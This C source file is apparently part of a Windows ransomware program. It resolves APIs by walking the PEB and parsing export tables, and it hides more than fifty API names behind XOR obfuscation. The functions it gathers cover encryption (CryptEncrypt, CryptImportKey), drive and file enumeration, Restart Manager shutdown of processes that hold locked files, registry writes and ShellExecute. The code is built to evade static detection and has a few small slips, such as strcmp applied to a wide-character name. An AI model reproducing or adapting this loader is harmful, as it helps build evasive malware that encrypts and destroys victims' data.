#include "PE.h"
FARPROC APIArray[52];
void resolveString(BYTE* buffer, BYTE* key, int size) {
	for (int i = 0; i < size; i++) {
		buffer[i] ^= 0xFF;
		buffer[i] ^= key[i % 5];
	}
}

HMODULE WINAPI hlpGetModuleHandle(LPCWSTR moduleName) {

	// get the offset of Process Environment Block
#ifdef _M_IX86 
	PEB* pPEB = (PEB*)__readfsdword(0x30);
#else
	PEB* pPEB = (PEB*)__readgsqword(0x60);
#endif

	// return base address of a calling module
	if (moduleName == NULL)
		return (HMODULE)(pPEB->ImageBaseAddress);

	PEB_LDR_DATA* Ldr = pPEB->Ldr;
	LIST_ENTRY* moduleList = NULL;

	moduleList = &Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* pStartListEntry = moduleList->Flink;

	for (LIST_ENTRY* pListEntry = pStartListEntry;
		pListEntry != moduleList;
		pListEntry = pListEntry->Flink) {

		LDR_DATA_TABLE_ENTRY* pEntry = (LDR_DATA_TABLE_ENTRY*)((BYTE*)pListEntry - sizeof(LIST_ENTRY));

		if (strcmp((const char*)pEntry->BaseDllName.Buffer, (const char*)moduleName) == 0)
			return (HMODULE)pEntry->DllBase;
	}
	return NULL;
}

FARPROC WINAPI hlpGetProcAddress(HMODULE hMod, char* procName) {

	BYTE* pBaseAddr = (BYTE*)hMod;

	// get pointers to main headers/structures
	IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)pBaseAddr;
	IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(pBaseAddr + pDosHdr->e_lfanew);
	IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;
	IMAGE_DATA_DIRECTORY* pExportDataDir = (IMAGE_DATA_DIRECTORY*)(&pOptionalHdr->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]);
	IMAGE_EXPORT_DIRECTORY* pExportDirAddr = (IMAGE_EXPORT_DIRECTORY*)(pBaseAddr + pExportDataDir->VirtualAddress);

	DWORD* pEAT = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfFunctions);
	DWORD* pFuncNameTbl = (DWORD*)(pBaseAddr + pExportDirAddr->AddressOfNames);
	WORD* pHintsTbl = (WORD*)(pBaseAddr + pExportDirAddr->AddressOfNameOrdinals);

	void* pProcAddr = NULL;

	if (((DWORD_PTR)procName >> 16) == 0) {
		WORD ordinal = (WORD)procName & 0xFFFF;
		DWORD base = pExportDirAddr->Base;

		if (ordinal < base || ordinal >= base + pExportDirAddr->NumberOfFunctions)
			return NULL;

		pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[ordinal - base]);
	}
	else {
		for (DWORD i = 0; i < pExportDirAddr->NumberOfNames; i++) {
			char* tmpFuncName = (char*)pBaseAddr + (DWORD_PTR)pFuncNameTbl[i];

			if (strcmp(procName, tmpFuncName) == 0) {
				pProcAddr = (FARPROC)(pBaseAddr + (DWORD_PTR)pEAT[pHintsTbl[i]]);
				break;
			}
		}
	}

	return (FARPROC)pProcAddr;
}

int initAPIArray() {
	BYTE kernel32_str[26] = { 163, 101, 100, 241, 48, 232, 43, 33, 180, 98, 164, 101, 18, 241, 80, 232, 75, 33, 181, 98, 164, 101, 109, 241, 98, 232 };
	BYTE kernel32_key[5] = { 23, 154, 222, 14, 157 };
	resolveString(kernel32_str, kernel32_key, 26);

	HMODULE hKernel32 = hlpGetModuleHandle((LPCWSTR)kernel32_str);


	BYTE GetProcAddress_key[5] = { 215, 26, 128, 74, 63 };
	BYTE GetProcAddress_str[15] = { 111, 128, 11, 229, 178, 71, 134, 62, 209, 164, 90, 128, 12, 198, 192 };
	resolveString(GetProcAddress_str, GetProcAddress_key, 15);
	APIArray[0] = hlpGetProcAddress(hKernel32, (char*)GetProcAddress_str);

	BYTE GetModuleHandleA_key[5] = { 230, 149, 27, 176, 221 };
	BYTE GetModuleHandleA_str[17] = { 94, 15, 144, 2, 77, 125, 31, 136, 42, 106, 120, 4, 128, 35, 71, 88, 106 };
	resolveString(GetModuleHandleA_str, GetModuleHandleA_key, 17);

	MemeGetProcAddress TempGetProcAddress = (MemeGetProcAddress)APIArray[0];

	APIArray[1] = TempGetProcAddress(hKernel32, (char*)GetModuleHandleA_str);
	if (!APIArray[1]) {
		return -1;
	}

	MemeGetModuleHandleA TempGetModuleHandleA = (MemeGetModuleHandleA)APIArray[1];

	BYTE GetLogicalDriveStringsA_key[5] = { 140, 41, 195, 151, 253 };
	BYTE GetLogicalDriveStringsA_str[24] = { 52, 179, 72, 36, 109, 20, 191, 95, 9, 110, 55, 164, 85, 30, 103, 32, 162, 78, 1, 108, 20, 165, 125, 104 };
	resolveString(GetLogicalDriveStringsA_str, GetLogicalDriveStringsA_key, 24);
	BYTE GetTempPathA_key[5] = { 47, 26, 109, 139, 166 };
	BYTE GetTempPathA_str[13] = { 151, 128, 230, 32, 60, 189, 149, 194, 21, 45, 184, 164, 146 };
	resolveString(GetTempPathA_str, GetTempPathA_key, 13);
	BYTE FindResourceA_key[5] = { 67, 153, 56, 180, 101 };
	BYTE FindResourceA_str[14] = { 250, 15, 169, 47, 200, 217, 21, 168, 62, 232, 223, 3, 134, 75 };
	resolveString(FindResourceA_str, FindResourceA_key, 14);
	BYTE SizeofResource_key[5] = { 23, 88, 6, 165, 118 };
	BYTE SizeofResource_str[15] = { 187, 206, 131, 63, 230, 142, 245, 156, 41, 230, 157, 213, 154, 63, 137 };
	resolveString(SizeofResource_str, SizeofResource_key, 15);
	BYTE LoadResource_key[5] = { 186, 193, 191, 0, 22 };
	BYTE LoadResource_str[13] = { 9, 81, 33, 155, 187, 32, 77, 47, 138, 155, 38, 91, 64 };
	resolveString(LoadResource_str, LoadResource_key, 13);
	BYTE LockResource_key[5] = { 254, 220, 248, 251, 208 };
	BYTE LockResource_str[13] = { 77, 76, 100, 111, 125, 100, 80, 104, 113, 93, 98, 70, 7 };
	resolveString(LockResource_str, LockResource_key, 13);
	BYTE CreateFileA_key[5] = { 78, 27, 51, 228, 27 };
	BYTE CreateFileA_str[12] = { 242, 150, 169, 122, 144, 212, 162, 165, 119, 129, 240, 228 };
	resolveString(CreateFileA_str, CreateFileA_key, 12);
	BYTE WriteFile_key[5] = { 230, 23, 133, 213, 93 };
	BYTE WriteFile_str[10] = { 78, 154, 19, 94, 199, 95, 129, 22, 79, 162 };
	resolveString(WriteFile_str, WriteFile_key, 10);
	BYTE CloseHandle_key[5] = { 172, 30, 197, 206, 88 };
	BYTE CloseHandle_str[12] = { 16, 141, 85, 66, 194, 27, 128, 84, 85, 203, 54, 225 };
	resolveString(CloseHandle_str, CloseHandle_key, 12);
	BYTE SetFilePointer_key[5] = { 46, 112, 145, 40, 114 };
	BYTE SetFilePointer_str[15] = { 130, 234, 26, 145, 228, 189, 234, 62, 184, 228, 191, 251, 11, 165, 141 };
	resolveString(SetFilePointer_str, SetFilePointer_key, 15);
	BYTE ReadFile_key[5] = { 167, 253, 133, 154, 153 };
	BYTE ReadFile_str[9] = { 10, 103, 27, 1, 32, 49, 110, 31, 101 };
	resolveString(ReadFile_str, ReadFile_key, 9);
	BYTE GetFileSize_key[5] = { 168, 205, 242, 55, 41 };
	BYTE GetFileSize_str[12] = { 16, 87, 121, 142, 191, 59, 87, 94, 161, 172, 50, 50 };
	resolveString(GetFileSize_str, GetFileSize_key, 12);
	BYTE lstrlenA_key[5] = { 80, 250, 85, 128, 42 };
	BYTE lstrlenA_str[9] = { 195, 118, 222, 13, 185, 202, 107, 235, 127 };
	resolveString(lstrlenA_str, lstrlenA_key, 9);
	BYTE CopyFileA_key[5] = { 136, 207, 42, 24, 44 };
	BYTE CopyFileA_str[10] = { 52, 95, 165, 158, 149, 30, 92, 176, 166, 211 };
	resolveString(CopyFileA_str, CopyFileA_key, 10);
	BYTE DeleteFileA_key[5] = { 246, 221, 38, 21, 64 };
	BYTE DeleteFileA_str[12] = { 77, 71, 181, 143, 203, 108, 100, 176, 134, 218, 72, 34 };
	resolveString(DeleteFileA_str, DeleteFileA_key, 12);
	BYTE CreateToolhelp32Snapshot_key[5] = { 95, 103, 189, 155, 219 };
	BYTE CreateToolhelp32Snapshot_str[25] = { 227, 234, 39, 5, 80, 197, 204, 45, 11, 72, 200, 253, 46, 20, 23, 146, 203, 44, 5, 84, 211, 240, 45, 16, 36 };
	resolveString(CreateToolhelp32Snapshot_str, CreateToolhelp32Snapshot_key, 25);
	BYTE Process32FirstW_key[5] = { 109, 109, 233, 47, 17 };
	BYTE Process32FirstW_str[16] = { 194, 224, 121, 179, 139, 225, 225, 37, 226, 168, 251, 224, 101, 164, 185, 146 };
	resolveString(Process32FirstW_str, Process32FirstW_key, 16);
	BYTE lstrcmpiW_key[5] = { 177, 109, 1, 98, 254 };
	BYTE lstrcmpiW_str[10] = { 34, 225, 138, 239, 98, 35, 226, 151, 202, 1 };
	resolveString(lstrcmpiW_str, lstrcmpiW_key, 10);
	BYTE Process32NextW_key[5] = { 56, 107, 53, 211, 215 };
	BYTE Process32NextW_str[15] = { 151, 230, 165, 79, 77, 180, 231, 249, 30, 102, 162, 236, 190, 123, 40 };
	resolveString(Process32NextW_str, Process32NextW_key, 15);
	BYTE MultiByteToWideChar_key[5] = { 236, 185, 177, 200, 182 };
	BYTE MultiByteToWideChar_str[20] = { 94, 51, 34, 67, 32, 81, 63, 58, 82, 29, 124, 17, 39, 83, 44, 80, 46, 47, 69, 73 };
	resolveString(MultiByteToWideChar_str, MultiByteToWideChar_key, 20);
	BYTE GetCurrentProcess_key[5] = { 35, 79, 202, 46, 197 };
	BYTE GetCurrentProcess_str[18] = { 155, 213, 65, 146, 79, 174, 194, 80, 191, 78, 140, 194, 90, 178, 95, 175, 195, 53 };
	resolveString(GetCurrentProcess_str, GetCurrentProcess_key, 18);
	BYTE GetProcessId_key[5] = { 57, 254, 83, 190, 234 };
	BYTE GetProcessId_str[13] = { 129, 100, 216, 17, 103, 169, 98, 201, 50, 102, 143, 101, 172 };
	resolveString(GetProcessId_str, GetProcessId_key, 13);
	BYTE GetModuleFileNameA_key[5] = { 176, 106, 62, 69, 107 };
	BYTE GetModuleFileNameA_str[19] = { 8, 240, 181, 247, 251, 43, 224, 173, 223, 210, 38, 249, 164, 244, 245, 34, 240, 128, 186 };
	resolveString(GetModuleFileNameA_str, GetModuleFileNameA_key, 19);
	BYTE lstrcmpA_key[5] = { 165, 247, 47, 219, 79 };
	BYTE lstrcmpA_str[9] = { 54, 123, 164, 86, 211, 55, 120, 145, 36 };
	resolveString(lstrcmpA_str, lstrcmpA_key, 9);
	BYTE FindFirstFileA_key[5] = { 138, 35, 217, 123, 0 };
	BYTE FindFirstFileA_str[15] = { 51, 181, 72, 224, 185, 28, 174, 85, 240, 185, 28, 176, 67, 197, 255 };
	resolveString(FindFirstFileA_str, FindFirstFileA_key, 15);
	BYTE EnterCriticalSection_key[5] = { 24, 224, 120, 218, 78 };
	BYTE EnterCriticalSection_str[21] = { 162, 113, 243, 64, 195, 164, 109, 238, 81, 216, 132, 126, 235, 118, 212, 132, 107, 238, 74, 223, 231 };
	resolveString(EnterCriticalSection_str, EnterCriticalSection_key, 21);
	BYTE LeaveCriticalSection_key[5] = { 36, 51, 176, 154, 46 };
	BYTE LeaveCriticalSection_str[21] = { 151, 169, 46, 19, 180, 152, 190, 38, 17, 184, 184, 173, 35, 54, 180, 184, 184, 38, 10, 191, 219 };
	resolveString(LeaveCriticalSection_str, LeaveCriticalSection_key, 21);
	BYTE FindNextFileA_key[5] = { 111, 196, 79, 101, 12 };
	BYTE FindNextFileA_str[14] = { 214, 82, 222, 254, 189, 245, 67, 196, 220, 154, 252, 94, 241, 154 };
	resolveString(FindNextFileA_str, FindNextFileA_key, 14);
	BYTE FindClose_key[5] = { 253, 74, 21, 67, 222 };
	BYTE FindClose_str[10] = { 68, 220, 132, 216, 98, 110, 218, 153, 217, 33 };
	resolveString(FindClose_str, FindClose_key, 10);
	BYTE ExitThread_key[5] = { 1, 92, 125, 69, 202 };
	BYTE ExitThread_str[11] = { 187, 219, 235, 206, 97, 150, 209, 231, 219, 81, 254 };
	resolveString(ExitThread_str, ExitThread_key, 11);
	BYTE GetNativeSystemInfo_key[5] = { 86, 231, 157, 203, 66 };
	BYTE GetNativeSystemInfo_str[20] = { 238, 125, 22, 122, 220, 221, 113, 20, 81, 238, 208, 107, 22, 81, 208, 224, 118, 4, 91, 189 };
	resolveString(GetNativeSystemInfo_str, GetNativeSystemInfo_key, 20);
	BYTE InitializeCriticalSection_key[5] = { 16, 233, 180, 27, 118 };
	BYTE InitializeCriticalSection_str[26] = { 166, 120, 34, 144, 224, 142, 122, 34, 158, 236, 172, 100, 34, 144, 224, 140, 119, 39, 183, 236, 140, 98, 34, 139, 231, 239 };
	resolveString(InitializeCriticalSection_str, InitializeCriticalSection_key, 26);
	BYTE CreateThread_key[5] = { 78, 186, 90, 172, 49 };
	BYTE CreateThread_str[13] = { 242, 55, 192, 50, 186, 212, 17, 205, 33, 171, 208, 33, 165 };
	resolveString(CreateThread_str, CreateThread_key, 13);
	BYTE WaitForMultipleObjects_key[5] = { 180, 146, 195, 202, 42 };
	BYTE WaitForMultipleObjects_str[23] = { 28, 12, 85, 65, 147, 36, 31, 113, 64, 185, 63, 4, 76, 89, 176, 4, 15, 86, 80, 182, 63, 30, 60 };
	resolveString(WaitForMultipleObjects_str, WaitForMultipleObjects_key, 23);
	BYTE DeleteCriticalSection_key[5] = { 72, 1, 64, 159, 140 };
	BYTE DeleteCriticalSection_str[22] = { 243, 155, 211, 5, 7, 210, 189, 205, 9, 7, 222, 157, 222, 12, 32, 210, 157, 203, 9, 28, 217, 254 };
	resolveString(DeleteCriticalSection_str, DeleteCriticalSection_key, 22);

	LPCSTR kernel32Names[35] = { (LPCSTR)GetLogicalDriveStringsA_str, (LPCSTR)GetTempPathA_str, (LPCSTR)FindResourceA_str, (LPCSTR)SizeofResource_str, (LPCSTR)LoadResource_str, (LPCSTR)LockResource_str, (LPCSTR)CreateFileA_str, (LPCSTR)WriteFile_str, (LPCSTR)CloseHandle_str, (LPCSTR)SetFilePointer_str, (LPCSTR)ReadFile_str, (LPCSTR)GetFileSize_str, (LPCSTR)lstrlenA_str, (LPCSTR)CopyFileA_str, (LPCSTR)DeleteFileA_str, (LPCSTR)CreateToolhelp32Snapshot_str, (LPCSTR)Process32FirstW_str, (LPCSTR)lstrcmpiW_str, (LPCSTR)Process32NextW_str, (LPCSTR)MultiByteToWideChar_str, (LPCSTR)GetCurrentProcess_str, (LPCSTR)GetProcessId_str, (LPCSTR)GetModuleFileNameA_str, (LPCSTR)lstrcmpA_str, (LPCSTR)FindFirstFileA_str, (LPCSTR)EnterCriticalSection_str, (LPCSTR)LeaveCriticalSection_str, (LPCSTR)FindNextFileA_str, (LPCSTR)FindClose_str, (LPCSTR)ExitThread_str, (LPCSTR)GetNativeSystemInfo_str, (LPCSTR)InitializeCriticalSection_str, (LPCSTR)CreateThread_str, (LPCSTR)WaitForMultipleObjects_str, (LPCSTR)DeleteCriticalSection_str };

	BYTE LoadLibraryA_key[5] = { 154, 125, 28, 117, 201 };
	BYTE LoadLibraryA_str[13] = { 41, 237, 130, 238, 122, 12, 224, 145, 235, 68, 28, 195, 227 };
	resolveString(LoadLibraryA_str, LoadLibraryA_key, 13);

	MemeLoadLibraryA TempLoadLibraryA = (MemeLoadLibraryA)TempGetProcAddress(hKernel32, (LPCSTR)LoadLibraryA_str);


	for (int i = 2; i < 37; i++) {
		APIArray[i] = TempGetProcAddress(hKernel32, kernel32Names[i - 2]);
	}

	BYTE ADVAPI32_DLL_key[5] = { 0, 168, 246, 19, 114 };
	BYTE ADVAPI32_DLL_str[13] = { 190, 19, 95, 173, 221, 182, 100, 59, 194, 201, 179, 27, 9 };
	resolveString(ADVAPI32_DLL_str, ADVAPI32_DLL_key, 13);

	HMODULE hAdvapi32 = TempLoadLibraryA((LPCSTR)ADVAPI32_DLL_str);
	if (!hAdvapi32) {
		return -1;
	}

	BYTE CryptGenRandom_key[5] = { 155, 239, 41, 194, 148 };
	BYTE CryptGenRandom_str[15] = { 39, 98, 175, 77, 31, 35, 117, 184, 111, 10, 10, 116, 185, 80, 107 };
	resolveString(CryptGenRandom_str, CryptGenRandom_key, 15);
	BYTE CryptEncrypt_key[5] = { 204, 175, 78, 235, 50 };
	BYTE CryptEncrypt_str[13] = { 112, 34, 200, 100, 185, 118, 62, 210, 102, 180, 67, 36, 177 };
	resolveString(CryptEncrypt_str, CryptEncrypt_key, 13);
	BYTE RegOpenKeyExA_key[5] = { 8, 241, 115, 31, 166 };
	BYTE RegOpenKeyExA_str[14] = { 165, 107, 235, 175, 41, 146, 96, 199, 133, 32, 178, 118, 205, 224 };
	resolveString(RegOpenKeyExA_str, RegOpenKeyExA_key, 14);
	BYTE RegSetKeyValueA_key[5] = { 236, 76, 162, 17, 244 };
	BYTE RegSetKeyValueA_str[16] = { 65, 214, 58, 189, 110, 103, 248, 56, 151, 93, 114, 223, 40, 139, 74, 19 };
	resolveString(RegSetKeyValueA_str, RegSetKeyValueA_key, 16);
	BYTE CryptReleaseContext_key[5] = { 237, 162, 74, 201, 142 };
	BYTE CryptReleaseContext_str[20] = { 81, 47, 204, 70, 5, 64, 56, 217, 83, 16, 97, 56, 246, 89, 31, 102, 56, 205, 66, 113 };
	resolveString(CryptReleaseContext_str, CryptReleaseContext_key, 20);
	BYTE CryptAcquireContextA_key[5] = { 14, 40, 148, 208, 0 };
	BYTE CryptAcquireContextA_str[21] = { 178, 165, 18, 95, 139, 176, 180, 26, 90, 150, 131, 178, 40, 64, 145, 133, 178, 19, 91, 190, 241 };
	resolveString(CryptAcquireContextA_str, CryptAcquireContextA_key, 21);
	BYTE CryptImportKey_key[5] = { 206, 101, 110, 36, 111 };
	BYTE CryptImportKey_str[15] = { 114, 232, 232, 171, 228, 120, 247, 225, 180, 226, 69, 209, 244, 162, 144 };
	resolveString(CryptImportKey_str, CryptImportKey_key, 15);

	LPCSTR Advapi32Names[7] = { (LPCSTR)CryptGenRandom_str, (LPCSTR)CryptEncrypt_str, (LPCSTR)RegOpenKeyExA_str, (LPCSTR)RegSetKeyValueA_str, (LPCSTR)CryptReleaseContext_str, (LPCSTR)CryptAcquireContextA_str, (LPCSTR)CryptImportKey_str };
	for (int i = 37; i < 44; i++) {
		APIArray[i] = TempGetProcAddress(hAdvapi32, Advapi32Names[i - 37]);
	}

	BYTE RSTRTMGR_DLL_key[5] = { 245, 206, 167, 81, 29 };
	BYTE RSTRTMGR_DLL_str[13] = { 88, 98, 12, 252, 182, 71, 118, 10, 128, 166, 70, 125, 88 };
	resolveString(RSTRTMGR_DLL_str, RSTRTMGR_DLL_key, 13);

	HMODULE hRstrtmgr = TempLoadLibraryA((LPCSTR)RSTRTMGR_DLL_str);
	if (!hRstrtmgr) {
		return -1;
	}

	BYTE RmStartSession_key[5] = { 25, 77, 251, 10, 77 };
	BYTE RmStartSession_str[15] = { 180, 223, 87, 129, 211, 148, 198, 87, 144, 193, 149, 219, 107, 155, 178 };
	resolveString(RmStartSession_str, RmStartSession_key, 15);
	BYTE RmRegisterResources_key[5] = { 169, 21, 22, 252, 118 };
	BYTE RmRegisterResources_str[20] = { 4, 135, 187, 102, 238, 63, 153, 157, 102, 251, 4, 143, 154, 108, 252, 36, 137, 140, 112, 137 };
	resolveString(RmRegisterResources_str, RmRegisterResources_key, 20);
	BYTE RmGetList_key[5] = { 155, 126, 235, 129, 115 };
	BYTE RmGetList_str[10] = { 54, 236, 83, 27, 248, 40, 232, 103, 10, 140 };
	resolveString(RmGetList_str, RmGetList_key, 10);
	BYTE RmShutdown_key[5] = { 91, 251, 199, 146, 75 };
	BYTE RmShutdown_str[11] = { 246, 105, 107, 5, 193, 208, 96, 87, 26, 218, 164 };
	resolveString(RmShutdown_str, RmShutdown_key, 11);
	BYTE RmEndSession_key[5] = { 56, 19, 14, 101, 70 };
	BYTE RmEndSession_str[13] = { 149, 129, 180, 244, 221, 148, 137, 130, 233, 208, 168, 130, 241 };
	resolveString(RmEndSession_str, RmEndSession_key, 13);

	LPCSTR RstrtmgrNames[7] = { (LPCSTR)RmStartSession_str, (LPCSTR)RmRegisterResources_str, (LPCSTR)RmGetList_str, (LPCSTR)RmShutdown_str, (LPCSTR)RmEndSession_str };
	for (int i = 44; i < 49; i++) {
		APIArray[i] = TempGetProcAddress(hRstrtmgr, RstrtmgrNames[i - 44]);
	}

	BYTE SHELL32_DLL_key[5] = { 13, 25, 93, 135, 247 };
	BYTE SHELL32_DLL_str[12] = { 161, 174, 231, 52, 68, 193, 212, 140, 60, 68, 190, 230 };
	resolveString(SHELL32_DLL_str, SHELL32_DLL_key, 12);

	HMODULE hShell32 = TempLoadLibraryA((LPCSTR)SHELL32_DLL_str);
	if (!hShell32) {
		return -1;
	}

	BYTE ShellExecuteA_key[5] = { 115, 213, 96, 40, 74 };
	BYTE ShellExecuteA_str[14] = { 223, 66, 250, 187, 217, 201, 82, 250, 180, 192, 248, 79, 222, 215 };
	resolveString(ShellExecuteA_str, ShellExecuteA_key, 14);
	APIArray[49] = TempGetProcAddress(hShell32, (LPCSTR)ShellExecuteA_str);

	BYTE SHLWAPI_DLL_key[5] = { 229, 202, 68, 113, 227 };
	BYTE SHLWAPI_DLL_str[12] = { 73, 125, 247, 217, 93, 74, 124, 149, 202, 80, 86, 53 };
	resolveString(SHLWAPI_DLL_str, SHLWAPI_DLL_key, 12);

	HMODULE hShlwapi = TempGetModuleHandleA((LPCSTR)SHLWAPI_DLL_str);
	if (!hShlwapi) {
		return -1;
	}

	BYTE PathFileExistsA_key[5] = { 52, 198, 19, 49, 202 };
	BYTE PathFileExistsA_str[16] = { 155, 88, 152, 166, 115, 162, 85, 137, 139, 77, 162, 74, 152, 189, 116, 203 };
	resolveString(PathFileExistsA_str, PathFileExistsA_key, 16);
	BYTE StrStrIA_key[5] = { 221, 122, 156, 7, 163 };
	BYTE StrStrIA_str[9] = { 113, 241, 17, 171, 40, 80, 204, 34, 248 };
	resolveString(StrStrIA_str, StrStrIA_key, 9);

	APIArray[50] = TempGetProcAddress(hShlwapi, (LPCSTR)PathFileExistsA_str);
	APIArray[51] = TempGetProcAddress(hShlwapi, (LPCSTR)StrStrIA_str);

	for (int i = 0; i < 52; i++) {
		if (!APIArray[i]) {
			return -1;
		}
	}
	return 0;
}

